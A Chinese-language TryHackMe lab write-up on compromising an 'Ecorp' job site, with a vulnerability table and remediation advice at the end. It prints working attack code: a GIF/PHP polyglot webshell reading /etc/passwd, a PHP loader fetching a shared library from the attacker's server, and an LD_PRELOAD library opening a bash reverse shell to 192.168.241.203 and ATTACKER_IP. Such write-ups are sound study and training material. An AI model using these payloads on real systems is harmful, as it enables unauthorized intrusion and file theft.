# THM 10.49.175.228 渗透测试 Writeup

**日期**: 2026-06-03
**测试者**: yao
**目标**: 10.49.175.228
**平台**: TryHackMe 授权靶场 (Ecorp)
**耗时**: ~60 分钟
**状态**: ✅ 完成 (1/1 Flag)

---

## 1. 信息搜集

### 1.1 端口扫描

```bash
nmap -sC -sV 10.49.175.228
```

**结果**：
| 端口   | 状态 | 服务 | 版本                             |
| ------ | ---- | ---- | -------------------------------- |
| 22/tcp | open | SSH  | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80/tcp | open | HTTP | Apache 2.4.18 (Ubuntu)           |

### 1.2 Web 枚举

```bash
gobuster dir -u http://10.49.175.228 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip
```

**发现**：
- `/cv.php` - 文件上传功能（上传简历）
- `/phpinfo.php` - PHP 配置信息泄露
- `/uploads/` - 上传文件存储目录（目录索引已启用）
- 网站标题: "Ecorp - Jobs"

### 1.3 PHP 配置分析

访问 `http://10.49.175.228/phpinfo.php` 获取关键配置：

- **PHP 版本**: 7.0
- **disable_functions**: `exec, passthru, shell_exec, system, proc_open, popen, pcntl_*`
- **file_uploads**: On ✅
- **upload_max_filesize**: 2M
- **open_basedir**: no value（无限制）
- **Web 根目录**: `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/`

---

## 2. 初始访问

### 2.1 文件上传漏洞利用

`cv.php` 要求上传图片格式的简历文件，但仅检查文件头是否为真实图片。

**创建 Polyglot 文件**：
```bash
cat > /tmp/shell.gif.php << 'EOF'
GIF89a
<?php echo file_get_contents($_GET['f']); ?>
EOF
```

**上传文件**：

```bash
curl -F "file=@/tmp/shell.gif.php" http://10.49.175.228/cv.php
```

**验证上传成功**：
```bash
curl -s http://10.49.175.228/uploads/
```

### 2.2 读取系统文件

利用 webshell 读取 `/etc/passwd`：
```bash
curl -s "http://10.49.175.228/uploads/shell.gif.php?f=/etc/passwd"
```

**发现用户**：`s4vi` (uid=1000)

---

## 3. disable_functions 绕过

### 3.1 绕过方案选择

由于 `system()`, `exec()`, `shell_exec()`, `proc_open()` 等命令执行函数均被禁用，常规反弹 shell 方法失效。

**选择方案**：LD_PRELOAD + mail() 劫持

**原理**：`mail()` 函数内部会调用系统的 `sendmail` 二进制文件。通过设置 `LD_PRELOAD` 环境变量，可以劫持 `sendmail` 加载的共享库，注入任意代码执行。

### 3.2 编写并编译 bypass.so

**创建 C 代码**：
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

uid_t getuid() {
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/192.168.241.203/9999 0>&1'");
    return 0;
}
```

**编译为共享库**：
```bash
gcc -shared -fPIC -o /tmp/bypass.so /tmp/bypass.c
```

### 3.3 上传 bypass.so

由于 `cv.php` 仅允许上传图片文件，直接使用 `curl -F` 上传 `.so` 文件会被拒绝（非真实图片）。

**解决方案**：利用已上传的 webshell，通过 `file_put_contents()` 或 `file_get_contents()` 从外部下载。

**启动本地 HTTP 服务器**：
```bash
python3 -m http.server 8888 --directory /tmp
```

**创建下载器 webshell**：
```php
GIF89a
<?php file_put_contents('/tmp/bypass.so', file_get_contents('http://192.168.241.203:8888/bypass.so')); ?>
```

**上传并触发下载**：
```bash
curl -F "file=@/tmp/download.gif.php" http://10.49.175.228/cv.php
curl -s http://10.49.175.228/uploads/download.gif.php
```

### 3.4 触发反弹 Shell

**创建 LD_PRELOAD 触发器**：
```php
GIF89a
<?php
putenv("LD_PRELOAD=/tmp/bypass.so");
mail("a@a.com", "", "", "");
?>
```

**上传并触发**：
```bash
curl -F "file=@/tmp/ld.gif.php" http://10.49.175.228/cv.php
```

**本地监听并触发**：
```bash
# 终端 1
nc -lvnp 9999

# 终端 2
curl -s http://10.49.175.228/uploads/ld.gif.php
```

**成功获取 www-data shell**

---

## 4. Flag 获取

### 4.1 读取 Flag

```bash
cat /home/s4vi/flag.txt
```

**Flag**: `thm{bypass_d1sable_functions_1n_php}`

---

## 5. 攻击路径总结

```
[信息搜集]
  └── Nmap 扫描 → 发现 22/80 端口
      └── Gobuster 目录爆破
          ├── /cv.php (文件上传)
          ├── /phpinfo.php (PHP 配置泄露)
          └── /uploads/ (上传目录)
              └── 上传 Polyglot webshell (GIF89a + PHP)
                  └── 读取 /etc/passwd → 发现 s4vi 用户
                      └── 尝试 SSH 公钥写入 (失败，权限不足)
                          └── LD_PRELOAD + mail() 绕过 disable_functions
                              └── 编译 bypass.so → 反弹 shell
                                  └── 获取 www-data shell
                                      └── 读取 flag.txt
```

---

## 6. 漏洞分析

### 6.1 漏洞列表

| 漏洞                   | 风险等级 | 说明                                          |
| ---------------------- | -------- | --------------------------------------------- |
| 文件上传绕过           | 高       | cv.php 仅检查文件头，Polyglot 文件可绕过      |
| PHP 配置泄露           | 中       | phpinfo.php 暴露 disable_functions 等敏感配置 |
| disable_functions 绕过 | 高       | LD_PRELOAD + mail() 可绕过命令执行限制        |
| 上传目录可执行         | 高       | uploads 目录允许执行 PHP 代码                 |

### 6.2 修复建议

1. **严格文件上传验证**
   - 验证文件扩展名白名单（仅允许 .jpg, .png, .gif）
   - 重命名上传文件，移除扩展名或使用随机文件名
   - 使用 `getimagesize()` 验证真实图片尺寸
   - 禁止上传目录执行 PHP 代码（.htaccess 或 nginx 配置）

2. **移除 phpinfo.php**
   - 生产环境禁止暴露 PHP 配置信息

3. **加固 disable_functions**
   - 同时禁用 `mail()`, `error_log()`, `putenv()` 等可用于绕过的函数
   - 或配置 `sendmail` 路径为不可执行脚本

4. **启用 open_basedir**
   - 限制 PHP 文件操作范围
   - 禁止访问 `/tmp`, `/home` 等敏感目录

5. **目录权限**
   - 上传目录设置不可执行权限
   - Web 用户禁止写入敏感目录

---

## 7. 技术细节

### 7.1 工具使用
- **Nmap**: 端口扫描
- **Gobuster**: Web 目录爆破
- **curl**: 文件上传、HTTP 请求
- **gcc**: 编译共享库
- **nc**: 反弹 shell 监听

### 7.2 关键命令速查
```bash
# 端口扫描
nmap -sC -sV 10.49.175.228

# Web 目录爆破
gobuster dir -u http://10.49.175.228 -w common.txt -x php,txt,html

# 文件上传
curl -F "file=@shell.gif.php" http://10.49.175.228/cv.php

# 读取系统文件
curl -s "http://10.49.175.228/uploads/shell.gif.php?f=/etc/passwd"

# 编译 bypass.so
cat > /tmp/bypass.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
uid_t getuid() {
    unsetenv("LD_PRELOAD");
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1'");
    return 0;
}
EOF
gcc -shared -fPIC -o /tmp/bypass.so /tmp/bypass.c

# 反弹 shell
nc -lvnp 9999
```

---

## 8. 时间线

| 时间  | 动作                     | 结果                     |
| ----- | ------------------------ | ------------------------ |
| T+0m  | Nmap 扫描                | 发现 22/80 端口          |
| T+10m | Web 枚举                 | 发现 cv.php, phpinfo.php |
| T+15m | 上传 Polyglot webshell   | 获取文件读取能力         |
| T+20m | 读取 /etc/passwd         | 发现 s4vi 用户           |
| T+30m | 编写并编译 bypass.so     | 准备 LD_PRELOAD 绕过     |
| T+40m | 上传下载器 + bypass.so   | 部署共享库               |
| T+50m | 触发 LD_PRELOAD + mail() | 成功反弹 shell           |
| T+60m | 读取 flag.txt            | 获取 flag                |

---

## 9. 参考

- [LD_PRELOAD 绕过 disable_functions](https://www.cnblogs.com/xiaoxiaoleo/p/13326608.html)
- [PHP disable_functions 绕过技术总结](https://xz.aliyun.com/t/5322)
- [GTFOBins - mail](https://gtfobins.github.io/gtfobins/mail/)

---

**文档状态**: ✅ 完成
**最后更新**: 2026-06-03